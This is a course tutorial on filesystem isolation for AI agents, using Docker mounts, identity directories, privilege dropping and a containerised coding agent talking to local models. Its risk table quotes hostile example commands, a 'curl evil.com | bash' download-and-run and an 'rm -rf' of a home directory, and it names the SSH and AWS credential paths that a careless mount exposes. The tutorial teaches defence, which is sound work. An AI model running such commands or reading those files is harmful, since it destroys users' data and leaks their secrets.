---
layout: textbook
permalink: /Tutorials/FilesystemIsolation
title: 'CS357: Foundations of Artificial Intelligence - Terminal and Filesystem Isolation for Agent Safety'
info:
  coursenum: CS357
  purpose: "To stop handing an agent the master key: scoping what it can read and write so one innocent mistake cannot reach the wrong directory."
  eyebrow: "Tutorial"
tags:
- safety
- filesystem
- isolation
---
## About This Tutorial

An agent that can write to any path on your filesystem is as dangerous as a houseguest who has been handed the master key, not because they are malicious, but because a single innocent mistake (wrong room, wrong drawer) can cause damage that is difficult or impossible to undo.  Filesystem isolation is not there because agents are malicious; it is that agents make *mistakes*, and a mistake inside a bounded workspace is recoverable while a mistake that touches your SSH keys, your production database credentials, or your system binaries may not be.
{: .tb-lede}

**Blast radius** is the term security engineers use for "how much damage can one mistake cause?"  A well-isolated agent has a small blast radius: even if it does something wrong, the consequences are limited to its designated workspace.  This tutorial develops the UNIX concepts, Docker primitives, and practical patterns you need to design small-blast-radius agent deployments.

## Key Concepts

| Term | Plain-English Definition | Where You'll Meet It |
|------|--------------------------|--------------------------|
| **Filesystem** | The organized hierarchy of directories and files on a computer, starting from a root (`/`) and branching into paths like `/home/user/projects/` | An agent reading `/workspace/input/data.txt` and writing results to `/workspace/output/summary.md` |
| **Blast Radius** | The maximum amount of damage a single mistake or malicious action can cause; a small blast radius means mistakes are contained and recoverable | An agent with write access only to `/workspace/output` has a small blast radius; one with access to `/` has an unlimited blast radius |
| **Principle of Least Privilege** | The security principle that every process should have exactly the permissions it needs to do its job, no more, no less | Giving a research agent read-only access to one knowledge base directory instead of read-write access to the entire home folder |
| **Bind Mount** | A Docker feature that makes a directory from the host machine visible inside a container, optionally as read-only | `-v /home/user/data:/data:ro` makes `/home/user/data` appear as `/data` inside the container and blocks all writes |
| **Identity Directory** | A dedicated home directory for one specific agent, containing only that agent's config, memory files, logs, and workspace, separate from every other agent's directory | `/home/user/agents/researcher/` contains only the researcher agent's files; the writer agent cannot see inside it |
| **chmod** | The Linux command for changing who is allowed to read, write, or execute a file or directory | `chmod 700 /agents/researcher` means only the owning user can enter that directory; everyone else is blocked |
| **`host.docker.internal`** | A hostname Docker resolves, from inside a container, to the machine the container is running on; `localhost` inside a container means the container itself | An agent in a container reaching your laptop's Ollama server at `http://host.docker.internal:11434/v1` instead of `localhost` |
{: .tb-full}

---

### Before You Start

**What you need:** Docker and a terminal.  The worked example near the end also expects Ollama running on your machine, and optionally OpenWebUI in front of it.

**What you will have at the end:** an agent sandbox where you can state exactly what the agent may read and write, and a real coding agent running inside it against your own models.

Take the sections in order, since each builds on the one before it.  Run the code blocks as you come to them instead of reading past them.

---

## Filesystem Access Permissions for Three Agent Configurations

The three configurations below represent a spectrum from minimal to dangerous.  Each row describes a real deployment pattern.  The filesystem is the agent's workspace; getting permissions wrong is like giving a houseguest the master key to your house instead of a key to just the guest room.  Study the access model and the resulting risk level before answering questions.

Study the Risk Level and "Why This Risk Level" columns first, then work backward to understand which access rules produced that risk level; this reverse-reading reveals the security reasoning more clearly than reading left to right.

| Agent Type | Filesystem Access | Network Access | Can Execute Shell? | Risk Level | Why This Risk Level |
|---|---|---|---|---|---|
| **Research Agent** | Read-only bind mount of `/home/user/knowledgebase` only; the agent cannot write to any path on the system | Outbound HTTPS to a whitelist of approved domains only; all other network traffic is blocked | No: the agent can only call registered tool functions; it cannot run `subprocess` or `exec` commands | Low | The agent can read stale data and produce wrong answers, but it cannot modify files, steal secrets it cannot reach, or install malware; mistakes are safe to recover from |
| **Writer Agent** | Write access to `/workspace/output` only; read access to `/workspace/input` (read-only flag set); no access to any other part of the filesystem | No network access at all: the agent is fully air-gapped from the internet | No: tool calls only, no shell access | Low-Medium | A hallucinated or incorrect output goes into `/workspace/output` and can be reviewed before use; the agent cannot read secrets elsewhere on the system or send data to an attacker |
| **Admin Agent** | Full read-write access to `/`, the root of the entire filesystem, including system directories | Unrestricted outbound network access to any address on the internet | Yes: can run arbitrary shell commands including `rm`, `curl`, `python`, and `ssh` | Critical | A single hallucinated command (`rm -rf /home/user/` or `curl evil.com \| bash`) is unrecoverable and could destroy the system, steal all credentials, or install persistent malware; there is no ceiling on how bad a mistake can be |
{: .tb-full}

### Questions to Work Through

1.  The Research Agent is described as "read-only" but still carries a non-trivial risk: it can read stale data.  Explain what "stale data" means in the context of a knowledge base (a collection of documents the agent uses to answer questions), and describe a specific scenario where reading correct-but-outdated information causes a downstream agent to produce harmful output.

   *Hint: Imagine the knowledge base contains drug dosage guidelines that were updated six months ago but the knowledge base was never refreshed.  The agent reads the old guidelines and uses them to answer a medical question.  What happens?*

2.  The Admin Agent's risk level is "Critical" even though its purpose (system administration) might seem to require broad access.  Propose a way to decompose the Admin Agent's tasks into two or more lower-privilege agents that together accomplish the same administrative goals while keeping each agent's blast radius small.

   *Hint: An admin might need to (a) read log files to diagnose problems, (b) restart services, and (c) update config files.  Do all three actions require the same permissions?  Could three separate agents each handle one task with only the access that task requires?*

3.  The Writer Agent has *no network access*.  Why is this restriction specifically important for an LLM-powered writer agent, beyond the general principle of least privilege?  What specific class of harm does network access enable for a writer agent that would not apply to a typical offline program?

   *Hint: Consider what an LLM-powered agent might do if it could make outbound HTTP requests.  Could it exfiltrate the content it is writing to an external server?  Could a prompt injection in an input document cause it to send data somewhere unexpected?*

---

## Setting Up Identity Directories and Running a Constrained Agent

Each agent in a multi-agent system should have its own **identity directory**: a home directory that contains only that agent's configuration, memory files, logs, and workspace.  Agents that share a home directory can accidentally read each other's memory or logs, creating information leakage between agents that were designed to be independent.

Think of identity directories like individual lockers in a school: each student (agent) has their own locker and cannot open anyone else's.  The teacher (the orchestrator) has a master key but only uses it when necessary.

The following terminal session sets up a two-agent workspace with isolated identity directories.  Read each comment carefully; the comments explain *why* each command is written the way it is, not just *what* it does.

The following terminal session creates two agent identity directories with restrictive permissions, then runs each agent in a Docker container with carefully scoped mounts.  Read the comments inside the code; each one explains a security decision, not just a syntax choice.

```bash

# Create the top-level agents directory under the project root

# mkdir -p creates all parent directories if they do not exist yet
mkdir -p /home/user/projects/myapp/agents

# Create identity directories for each agent

# The curly-brace notation {config,memory,logs,workspace} creates four subdirectories at once

# config = agent's settings, memory = things the agent remembers between runs,

# logs = record of what the agent did, workspace = files the agent is currently working on
mkdir -p /home/user/projects/myapp/agents/researcher/{config,memory,logs,workspace}
mkdir -p /home/user/projects/myapp/agents/writer/{config,memory,logs,workspace}

# Set restrictive permissions so only the owning user can enter these directories

# chmod 700 means: owner can read/write/enter; group members cannot; everyone else cannot

# Without this, any other user on the system could read the agent's memory and logs
chmod 700 /home/user/projects/myapp/agents/researcher
chmod 700 /home/user/projects/myapp/agents/writer

# Create a shared knowledge base that the researcher can read

# chmod 755 means: owner can read/write/enter; everyone else can read and enter (but not write)

# This makes the knowledge base readable by the agent inside Docker, which runs as a different UID
mkdir -p /home/user/projects/myapp/shared/knowledgebase
chmod 755 /home/user/projects/myapp/shared/knowledgebase

# Create an output directory the writer will produce files in

# chmod 750 means: owner can read/write/enter; group members can read and enter; others cannot
mkdir -p /home/user/projects/myapp/shared/output
chmod 750 /home/user/projects/myapp/shared/output

# Run the researcher agent in a Docker container with carefully chosen volume mounts:

# -v .../researcher:/home/agent:rw  -> researcher's own identity dir, read-write (it can save memory/logs)

# -v .../knowledgebase:/data/kb:ro  -> shared knowledge base, READ-ONLY (it cannot change the source docs)

# --network none                    -> no internet access (prevents data exfiltration)

# The writer's identity directory is NOT mounted here; researcher literally cannot see it
docker run --rm \
  -v /home/user/projects/myapp/agents/researcher:/home/agent:rw \
  -v /home/user/projects/myapp/shared/knowledgebase:/data/kb:ro \
  --network none \
  my-researcher-image \
  python agent.py --task "summarize recent papers on RAG retrieval"

# Expected: the agent runs, writes summaries to /home/agent/workspace/, exits cleanly

# Run the writer agent with its own separate set of mounts:

# -v .../writer:/home/agent:rw           -> writer's own identity dir, read-write

# -v .../shared/output:/workspace/output:rw  -> shared output dir, read-write (writer produces files here)

# -v .../researcher/workspace:/workspace/input:ro  -> researcher's OUTPUT only, read-only

# Notice: the writer gets researcher's WORKSPACE (output files), NOT researcher's config or memory
docker run --rm \
  -v /home/user/projects/myapp/agents/writer:/home/agent:rw \
  -v /home/user/projects/myapp/shared/output:/workspace/output:rw \
  -v /home/user/projects/myapp/agents/researcher/workspace:/workspace/input:ro \
  --network none \
  my-writer-image \
  python agent.py --task "draft a 500-word section from the summaries"

# Expected: the agent reads summaries from /workspace/input/, writes a draft to /workspace/output/
```

The table below maps the same physical directories to what each agent sees inside its container.  Notice that some paths on the host are completely invisible to one agent; Docker's mount system enforces this, not convention.

**Before vs. After: What the Agent Can See**

| Path on Host | Researcher Sees It As | Writer Sees It As |
|---|---|---|
| `/home/user/projects/myapp/agents/researcher/` | `/home/agent/` (read-write) | Not visible at all |
| `/home/user/projects/myapp/agents/writer/` | Not visible at all | `/home/agent/` (read-write) |
| `/home/user/projects/myapp/shared/knowledgebase/` | `/data/kb/` (read-only) | Not visible at all |
| `/home/user/projects/myapp/agents/researcher/workspace/` | `/home/agent/workspace/` (read-write) | `/workspace/input/` (read-only) |
| `/home/user/projects/myapp/shared/output/` | Not visible at all | `/workspace/output/` (read-write) |
{: .tb-full}

> Many students assume that "running in Docker" automatically prevents an agent from accessing sensitive files.  It does not: Docker only isolates what you tell it to isolate.  If you mount `/home/user:/home/user`, the agent inside the container can read your SSH keys, browser cookies, and git credentials just as easily as if Docker were not there at all.  The safety comes from choosing restrictive mounts, not from Docker itself.
{: .tb-pitfall data-title="Common Misconception"}

### Questions to Work Through

4.  In the Docker commands above, the researcher's full identity directory is NOT mounted into the writer's container.  The writer only gets `researcher/workspace` as read-only input.  Why is this distinction important?  What specific files inside the researcher's identity directory should the writer agent never be able to access?

   *Hint: The researcher's `config/` directory might contain API keys or credentials the researcher uses to call external services.  The researcher's `memory/` directory might contain a record of every task it has ever worked on, including tasks from other projects.  Should the writer need any of that information to draft a 500-word section?*

5.  Both agents run with `--network none`.  Now suppose the researcher needs to call a web search API to find recent papers.  Rewrite the researcher's `docker run` command to allow *only* outbound HTTPS traffic to `api.searchprovider.com`, and describe what additional piece of infrastructure (not a Docker flag) would actually be needed to enforce this at the network level.

   *Hint: `--network none` is a binary switch: network on or network off.  To allow only one specific destination, you need something that can inspect network packets and block everything except traffic to one IP address.  What kind of network component does that?*

6.  Log files in `agents/researcher/logs/` accumulate over time and record everything the agent did during a run.  Explain why these logs function as an **audit trail**, and describe two specific, concrete things a security engineer could learn from reviewing them after a suspicious agent run.

   *Hint: If the logs record every file the agent read, every tool it called, and every output it produced, what could those records reveal about whether the agent was behaving normally or had been manipulated by a prompt injection attack?*

An agent's **identity directory** is designed to:

- Give the agent access to the entire user home directory for maximum flexibility; mounting `/home/user` gives each agent a consistent, full-featured environment to work in
- Store the agent's model weights and embedding indices; keeping model artifacts in the identity directory ensures the agent always uses the correct model version
- Provide each agent with an isolated space for its own config, memory, logs, and workspace so agents cannot accidentally access each other's state
- Replace Docker isolation as a lighter-weight alternative; identity directories provide the same filesystem isolation as Docker without the container overhead

<details markdown="1"><summary>Answer</summary>

Provide each agent with an isolated space for its own config, memory, logs, and workspace so agents cannot accidentally access each other's state

</details>

---

## Docker Volume Mounts - What Can the Agent Touch?

Two students are deploying the same researcher agent.  Their Docker commands look similar but have dramatically different security properties.  Study the difference carefully.

The key to reading these commands is understanding the `-v` flag: `-v HOST_PATH:CONTAINER_PATH:FLAGS`.  The host path is what exists on your real machine; the container path is what the agent sees inside Docker; the optional `:ro` flag means read-only (no writes allowed).

Read each of the two `docker run` commands below and predict its blast radius before you look at the comparison table.

**Student A's command:**

```bash

# Student A mounts their ENTIRE home directory into the container

# The agent inside the container sees /home/user, which includes:

#   - SSH private keys at ~/.ssh/id_rsa (used to authenticate to servers)

#   - AWS credentials at ~/.aws/credentials (used to access cloud services)

#   - Git config at ~/.gitconfig (contains name, email, and sometimes tokens)

#   - Every project, download, and document in the home directory
docker run --rm \
  -v /home/user:/home/user \    # <-- THIS is the problem: the entire home is mounted
  my-researcher-image \
  python agent.py
```

**Student B's command:**

```bash

# Student B mounts ONLY the researcher's specific workspace directory

# :ro at the end means read-only; even if the agent tries to write, it will get a permission error

# The agent inside the container sees /workspace, which contains ONLY:

#   - The files the researcher was given to work with

#   - Nothing else from the host machine
docker run --rm \
  -v /home/user/agents/researcher:/workspace:ro \    # <-- ONLY the researcher dir, read-only
  my-researcher-image \
  python agent.py
```

| Question | Student A: What Actually Happens | Student B: What Actually Happens |
|---|---|---|
| What path does the agent see inside the container? | `/home/user`: the agent's view of the filesystem matches the real home directory exactly | `/workspace`: the agent can only see the single researcher directory, renamed to `/workspace` inside the container |
| Can the agent read `~/.ssh/id_rsa` (private SSH key)? | Yes: SSH keys are in `/home/user/.ssh/` which is fully mounted; the agent can read and transmit the key | No: only `/workspace` is mounted; `~/.ssh/` does not exist inside this container |
| Can the agent read `~/.aws/credentials` (AWS access keys)? | Yes: AWS credentials live in the mounted home directory and are fully readable | No: only `/workspace` is mounted; `.aws/` does not exist inside this container |
| Can the agent modify files it can read? | Yes: no `:ro` flag was used, so all mounted files are read-write by default | No: the `:ro` flag makes the entire mount read-only; any write attempt returns "Read-only file system" error |
| If the agent hallucinates a destructive write command like `rm -rf /home/user/documents`, what is damaged? | Every file in `/home/user/documents/` is permanently deleted, including all projects and personal files | The write attempt fails immediately with a permission error; no files are changed |
| What is the blast radius of the worst possible agent action? | Unlimited within the user's home directory: every file, credential, and project is at risk | Zero for writes (read-only mount): the agent literally cannot change anything on the host |
{: .tb-full}

### Questions to Work Through

7.  Student A's mount exposes `~/.gitconfig`, which contains the user's name and email address.  This seems harmless; it is not a password or a private key.  Describe a concrete scenario where an agent with read access to `.gitconfig` *and* write access to a git repository could use that information in a way the user did not intend.

   *Hint: Git uses the name and email from `.gitconfig` when creating commits.  If the agent can make commits on your behalf using your name and email, what could it commit, and whose reputation would be affected?*

8.  Student B's mount is read-only, which prevents the researcher agent from writing its own logs or memory files inside `/workspace`.  This seems to break the identity-directory pattern from Model 2 (where the agent needed to write to its own directory).  How do you resolve this tension?  Rewrite Student B's command to allow write access to a specific subdirectory for logs and memory while keeping all other content read-only.

   *Starter hint: You can add a second `-v` flag to a single `docker run` command.  A second mount with `:rw` on a specific subdirectory will give write access just to that path, even if the main mount is `:ro`.*

   ```bash
   # Your revised command goes here
   # You need two -v flags: one for the read-only researcher content,
   # one for a writable logs/memory location
   docker run --rm \
     -v /home/user/agents/researcher:/workspace:ro \
     -v ??? \   # <-- add a second mount here for write access
     my-researcher-image \
     python agent.py
   ```

9.  Two agents share a single read-write filesystem volume mounted at `/shared/output`.  Agent 1 writes a file called `draft.md` containing its summary.  Agent 2 also writes a file called `draft.md` containing its own different summary.  Describe exactly what happens at the filesystem level when Agent 2 writes its file, and explain why this is a problem for the pipeline.  What naming convention or coordination mechanism would prevent this collision?

   *Hint: Filesystems do not lock files between separate processes by default; one process can silently overwrite another's file.  What information that each agent already has could be used to create a unique filename that avoids collisions?*

---

## A Worked Example: pi.dev in a Container, Talking to Your Own Models

Everything above has been about drawing the boundary.  This section builds one end to end, with a real agent inside it, so you can see what the boundary costs you and what it does not.

The agent is [pi](https://pi.dev), a small terminal coding agent installed with one `npm install`.  Small matters here: pi's whole surface is a binary, a config directory, and whatever plugins you chose to install, so the question "what can this thing reach?" has an answer you can read off a Dockerfile instead of guessing.  The models come from your own machine, either straight from Ollama or through OpenWebUI, so no key leaves your laptop and no request leaves your network.

### The localhost problem, first

The one thing that trips up everyone doing this for the first time: **inside a container, `localhost` means the container.**  It does not mean your laptop.  Ollama is listening on your laptop's port 11434, and a containerized agent that dials `http://localhost:11434` is dialing a port on a machine where nothing is listening, then reporting a connection refused that looks like a broken install.

Docker's answer is a special hostname that resolves to the host from inside the container:

| Where the agent runs | Ollama | OpenWebUI |
|---|---|---|
| Directly on your laptop | `http://localhost:11434/v1` | `http://localhost:3000/api/v1` |
| Inside a container | `http://host.docker.internal:11434/v1` | `http://host.docker.internal:3000/api/v1` |
{: .tb-full}

Two caveats that cost people an hour each:

- **On Linux, `host.docker.internal` does not exist unless you ask for it.**  Docker Desktop on macOS and Windows provides it automatically; plain Docker Engine on Linux does not.  Add `--add-host=host.docker.internal:host-gateway` to your `docker run` and it resolves.
- **Ollama listens only on `127.0.0.1` by default**, which the container cannot reach even with the right hostname.  Restart it with `OLLAMA_HOST=0.0.0.0 ollama serve` so it accepts connections from the Docker bridge network.  Be aware of what you just did: anything that can reach your machine on port 11434 can now use your models, so do this on a laptop or a trusted network, not on shared campus wifi.

> A connection error here is almost never the agent's fault.  Before you touch pi's config, prove the endpoint is reachable *from inside the container*: `docker run --rm --add-host=host.docker.internal:host-gateway curlimages/curl -s http://host.docker.internal:11434/v1/models`.  If that returns JSON, the network is fine and the problem is configuration.  If it hangs or refuses, fix the network first.
{: .tb-warning data-title="Watch out"}

### The Dockerfile

pi's model support is extensible through plugins, and connecting it to an arbitrary OpenAI-compatible endpoint (which is what both Ollama and OpenWebUI expose) is what **[pi-openai-compat](https://github.com/BillJr99/pi-openai-compat)** does.  It registers each endpoint as a first-class pi provider, so their models show up in pi's own `/model` picker next to everything else, and it will hold **several providers at once**.  That last property is the one this section leans on.

Both installs are ordinary npm-shaped commands, so both belong in the image:

```dockerfile
FROM node:20-slim

# git is not optional: every coding agent assumes it, and pi uses it to show
# you changes before it writes anything
RUN apt-get update && apt-get install -y --no-install-recommends git ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Run as a non-root user. If the agent ever does escape its mount, it should
# land as nobody-in-particular rather than as root on your host's UID 0.
RUN useradd --create-home --shell /bin/bash agent
USER agent
ENV HOME=/home/agent

# The agent itself
RUN npm install -g --prefix "$HOME/.npm-global" @mariozechner/pi-coding-agent
ENV PATH="$HOME/.npm-global/bin:$PATH"

# The provider plugin. This must run AFTER USER and HOME are set, or the
# plugin installs into root's home and the agent user never sees it.
RUN pi install npm:@billjr99/pi-openai-compat

WORKDIR /workspace
CMD ["pi"]
```

Build it once:

```bash
docker build -t course-pi .
```

> **Why `--prefix` instead of a plain global install?**  A bare `npm install -g` as a non-root user fails on permissions, and the usual fix (`sudo npm i -g`) installs the agent as root, which is exactly the thing this whole tutorial is arguing against.  Pointing npm's global prefix at the agent's own home keeps the install unprivileged and keeps the whole agent inside one directory you can inspect.

### Running it with a boundary you chose

Now apply Student B's lesson from the section above.  One writable mount for the work, one read-only mount for reference, and nothing else:

```bash
docker run -it --rm \
  --add-host=host.docker.internal:host-gateway \
  -v "$PWD:/workspace:rw" \
  -v "$HOME/agents/knowledgebase:/reference:ro" \
  -v pi-config:/home/agent/.config \
  --cap-drop ALL --security-opt no-new-privileges \
  course-pi
```

Read that command as a list of decisions rather than as boilerplate.  `$PWD` and nothing above it is what the agent can change, so launch it from a project directory and never from `~`.  `/reference` is readable and not writable, so the agent can consult your notes and cannot rewrite them.  `--cap-drop ALL` removes the Linux capabilities a coding agent has no business holding, and `--security-opt no-new-privileges` stops any process inside from acquiring more than it started with.  The named volume `pi-config` is the one deliberate exception to `--rm`: it survives the container so you do not re-register your providers on every launch, and it holds credentials, which is why it is a volume you can inspect and delete rather than a bind mount into your real `~/.config`.

Notice what is *not* there.  No `-v $HOME:/home/agent`.  No `-e OPENAI_API_KEY`.  No `-e ANTHROPIC_API_KEY`.  The agent has no cloud credentials because it does not need any: the model is on the other side of `host.docker.internal`, on hardware you own.

### Connecting to OpenWebUI and Ollama at the same time

Inside pi, run the plugin's login command once per endpoint:

```text
/compat-login
```

The wizard asks which provider, then for a base URL and a key.  Do it twice.

**First, Ollama.**  Choose *Ollama (local, keyless)*, then **replace the offered `http://localhost:11434/v1` with `http://host.docker.internal:11434/v1`**, because you are in a container and the default is the host-native form.  There is no key; Ollama does not use one.  pi fetches the model list and every model you have pulled appears in `/model`.

**Then, OpenWebUI.**  Run `/compat-login` again and choose *Custom*.  The base URL is `http://host.docker.internal:3000/api/v1`, and the key is one you mint yourself in OpenWebUI under *Settings -> Account -> API Keys*.  That key authenticates you to a server running on your own machine; it is not a payment credential and nothing is billed.

Now run `/model`.  Both providers are listed, labeled separately, with all their models, and you switch between them mid-session.  That is the point of doing both: they are not the same route to the same thing.

| | Straight to Ollama | Through OpenWebUI |
|---|---|---|
| What you get | The raw models you have pulled, nothing more | The models *plus* whatever you configured in OpenWebUI: knowledge bases, tools, system prompts, per-model settings |
| Auth | None | A key you generate on your own server |
| Fewest moving parts | Yes.  If a model misbehaves, it is the model | No.  A bad answer could be the model, the retrieval, or the prompt template |
| Use it when | You are debugging, benchmarking, or want the model's honest unassisted behavior | You want the agent to inherit the RAG setup and tooling you already built |
{: .tb-full}

Keeping both registered means you can answer "is this the model or is this my pipeline?" by switching providers and re-asking, which is a debugging move you will want more often than you expect.

### Baking the configuration into the image

The wizard is fine for one person at one laptop.  For a lab where twenty students should get a working agent on first launch, pre-seed the config instead.  The plugin stores providers in `~/.config/pi-openai-compat/config.json`, it re-reads that file at session start, and a provider with an empty `cachedModels` list triggers a live fetch of the model catalog on first run.  So a hand-written file with both endpoints and no cached models is exactly the right thing to ship:

```dockerfile
RUN mkdir -p "$HOME/.config/pi-openai-compat" && \
    printf '%s' '{ \
      "previousModel": null, \
      "providers": { \
        "ollama": { \
          "displayName": "Ollama (local)", \
          "baseUrl": "http://host.docker.internal:11434/v1", \
          "apiKey": null, \
          "cachedModels": [] \
        }, \
        "openwebui": { \
          "displayName": "OpenWebUI", \
          "baseUrl": "http://host.docker.internal:3000/api/v1", \
          "apiKey": null, \
          "cachedModels": [] \
        } \
      } \
    }' > "$HOME/.config/pi-openai-compat/config.json"
```

Leave `apiKey` as `null` in the image and let each student supply their own OpenWebUI key with `/compat-login` on first run, which re-registers that one provider with the key attached.  **Do not bake a key into a Dockerfile.**  An image is a shareable artifact and every layer is readable with `docker history`; a key committed there is a key published there.  This is the same reasoning that kept `-e ANTHROPIC_API_KEY` out of the `docker run` above.

### What the boundary actually bought you

| Question | Answer, and why |
|---|---|
| Can pi read your SSH keys? | No.  `~/.ssh` was never mounted, so the path does not exist inside the container |
| Can pi read your notes? | Yes, at `/reference`, because you chose to mount them |
| Can pi *change* your notes? | No.  `:ro` makes the write fail at the kernel, not at the agent's discretion |
| Can pi edit your project? | Yes, at `/workspace`.  This is the one thing you granted, and the action log plus `git status` is how you audit it |
| Can pi reach the internet? | Yes, unless you add `--network none`, which also cuts off the models.  Reaching only your host is a middle ground you have to build with a custom network |
| If pi runs a destructive command, what is lost? | Uncommitted work in the current project.  Nothing else on the host is reachable |

Compare that last row to Student A's mount, where the honest answer was "your home directory."  The difference is four flags in a `docker run`.

### Questions to Work Through

10.  The `pi-config` named volume exists so provider registrations survive `--rm`.  It also stores an OpenWebUI key in plaintext.  Name one thing that key can do if someone gets the volume, and one thing it cannot, then say whether the convenience is worth it for a shared lab machine as opposed to your own laptop.

   *Hint: Ask what the key authenticates to and what lives behind that server.  Compare `docker volume inspect pi-config` (which shows you where it lives on the host) with what a cloud provider key would expose if leaked the same way.*

11.  You set `OLLAMA_HOST=0.0.0.0` so the container could reach the model server, and in doing so you exposed port 11434 to every machine that can route to yours.  Describe what an attacker on the same network could do with an open Ollama endpoint, and propose a `docker run` change or a firewall rule that restores the container's access without leaving the port open to the network.

   *Hint: An open Ollama endpoint accepts generate requests and can also pull and delete models.  For the fix, consider binding to the Docker bridge address specifically rather than to all interfaces, or a host firewall rule that permits the `docker0` interface and drops everything else.*

12.  Both providers are registered and you ask the same question through each: Ollama answers correctly and OpenWebUI answers wrong.  Nothing about the model changed between the two.  List the components that exist on the OpenWebUI path but not the Ollama path, then write the order you would check them in, cheapest test first.

   *Hint: The table above names the extra components.  For ordering, prefer tests that need no code: comparing the two answers is free, checking which documents were retrieved is nearly free, and re-running with retrieval disabled isolates one variable cleanly.*

---

## One Script Instead of an Image, and What That Convenience Costs

The section above built an image and then ran it.  That is two steps, and the first one is slow.  It is reasonable to want a single file you can drop into a project and run, with no image to build and nothing to remember, and this section works through exactly that file.  It also works through the bill, because the convenience is not free and the price is paid in privileges.

Here is the trade in one table.  Read the third row first, because it is the one that matters.

| | Prebuilt image (the section above) | Self-contained script (this section) |
|---|---|---|
| Setup before first use | `docker build`, once, a few minutes | None |
| Privileged work | At build time, once, on your terms | On every single launch |
| Who the agent runs as | The image's `agent` user, or you.  Never root | Your own uid, after a root setup phase |
| Works with no network | Yes, after the build | No.  It reinstalls `apt` and `npm` packages every time |
| Time to a prompt | Seconds | A minute or two |
| Changing the pinned version | Edit the Dockerfile, rebuild | Edit one line of the script |
{: .tb-full}

The reason for the third row is mechanical rather than careless.  A stock `node:24-bookworm` image does not contain `git`, `python3`, or `ripgrep`, and installing them means `apt-get`, and `apt-get` means root.  An image can do that work once at build time and then drop to an ordinary user forever after.  A single script that starts from a stock image has no build step to hide the privileged work in, so it has to become root at run time, every time you launch it, and then decide what to do with that privilege once the installing is finished.

The script's answer is to give it up.  It runs as your own user account by default, dropping out of root as soon as the packages are in place, so the files it writes into your project stay yours.  What it cannot do is avoid holding root in the first place, and that residue is the subject of the next two subsections.

> Container root is not a lesser kind of root.  Unless you have configured user-namespace remapping, which almost nobody has, UID 0 inside the container is UID 0 on your host for anything bind-mounted.  Two concrete consequences follow, and they are why the default is what it is.  Files created while the agent is root come back owned by `root`, and you will need `sudo` to edit your own work.  And the thing that gets loose in a container escape is a root process rather than an ordinary one.
{: .tb-warning data-title="Watch out"}

Download the file and read along:

- [run-pi-ollama.sh]({{ site.baseurl }}/files/pi-ollama/run-pi-ollama.sh) for bash, on macOS, Linux, and WSL
- [run-pi-ollama.ps1]({{ site.baseurl }}/files/pi-ollama/run-pi-ollama.ps1) for PowerShell, on Windows

They are the same program.  Every path below quotes the bash file; the PowerShell file differs only in its syntax, and the places where the platform itself differs are called out where they arise.

### What the script decides, and where you change it

The whole configuration is a block of shell parameter expansions at the top.  The `${NAME:-default}` form means "use the environment variable `NAME` if it is set, otherwise this default", so every one of these is overridable without editing the file:

```bash
PROJECT_DIR="${PI_PROJECT_DIR:-$PWD}"
BASE_IMAGE="${PI_BASE_IMAGE:-node:24-bookworm}"
PI_PACKAGE="${PI_PACKAGE:-@earendil-works/pi-coding-agent@0.85.1}"
PI_RUN_AS="${PI_RUN_AS:-user}" # user or root; package bootstrap always runs as root
PI_OLLAMA_MODEL="${PI_OLLAMA_MODEL:-llama3.2}"
PI_OLLAMA_URL="${PI_OLLAMA_URL:-http://host.docker.internal:11434}"
PI_FALLBACK_CONTEXT="${PI_FALLBACK_CONTEXT:-8192}"
PI_MAX_CONTEXT="${PI_MAX_CONTEXT:-0}" # 0: no extra client ceiling
```

Four of those lines are worth pausing on.

`PI_PACKAGE` pins an exact version.  An unpinned agent is a different program every week, and "it worked yesterday" stops being evidence of anything.  The same reasoning pins Node 24 in the course container and CPython in its base image.

`PI_OLLAMA_URL` is the host-bridge address from Section 3 of this tutorial, not `localhost`.  Inside a container `localhost` is the container, and this is the single most common way this setup fails.

`PI_OLLAMA_MODEL` is `llama3.2`, the model you already pulled for the Overview assignment.  It is a 3B model driving a long agentic loop, and you should expect to watch it strain.  That is discussed at length in the next section.

`PI_FALLBACK_CONTEXT` is the one setting whose name is a lie worth understanding, and it gets its own subsection below.

### Dropping privileges, and the setting that does less than it sounds like

The default, `PI_RUN_AS=user`, is the interesting path, so start there.  You opt out of it rather than into it:

```bash
PI_RUN_AS=root bash run-pi-ollama.sh
```

```powershell
$env:PI_RUN_AS = "root"; .\run-pi-ollama.ps1
```

Choose that only when you need the agent itself to install system packages, and expect the warning the script prints when you do.  Left at its default, the container takes this branch instead, after the packages are installed:

```bash
if [[ "$PI_RUN_AS" == user ]]; then
    chown -R "$PI_USER_UID:$PI_USER_GID" "$PI_HOME"
    exec setpriv --reuid="$PI_USER_UID" --regid="$PI_USER_GID" --clear-groups \
        --bounding-set=-all --inh-caps=-all --ambient-caps=-all \
        env HOME="$PI_HOME" PATH="/opt/pi/node_modules/.bin:$PATH" \
        python3 /opt/pi-launcher/launcher.py
fi
```

`setpriv` changes the user and group of the process about to run, and the three capability flags make the change one-way: `--bounding-set=-all` drops the capabilities the process could ever regain, and `--inh-caps=-all` and `--ambient-caps=-all` stop any of them from being inherited by what it launches.  The agent that starts after this line is genuinely unprivileged, and on Linux and macOS the files it writes into your project come back owned by you.

> running as a user is not the same thing as rootless, and the difference is not pedantry.  The container still *starts* as root: the `docker run` line passes `--user 0:0`, and the `apt-get` and `npm install` above this branch both run with full privileges.  What the default gives you is a smaller window, not no window.  Everything that executes before `setpriv` is still root, including any code an `apt` or `npm` package chooses to run during installation.  If you want a container that is never root at any point, the only way to get one is to move the privileged work to build time, which is what the Dockerfile route below does.  Reading a claim of "runs as a user" carefully enough to ask *starting when?* is the transferable skill here.
{: .tb-pitfall data-title="Common Misconception"}

In the script's favor, three real mitigations are already in place, and it is worth naming what each one does and does not buy:

| Flag | What it prevents | What it does not prevent |
|---|---|---|
| `--security-opt=no-new-privileges` | A process inside gaining *more* privilege than it started with, through setuid binaries | Anything root can already do, which at UID 0 is nearly everything |
| `--pids-limit=1024` | A fork bomb taking your machine down with it | A single process doing damage slowly |
| `npm install --ignore-scripts` | Package lifecycle hooks running arbitrary code as root during install | The package itself misbehaving once you actually run it |
{: .tb-full}

That table is also the answer to "why does the default still matter if the container starts as root anyway?"  The root phase is short, scripted, and contains no agent; the phase after it is long, open-ended, and contains a model acting on instructions that may have come from your files.  Shrinking the second phase's privileges is worth doing even when you cannot shrink the first.

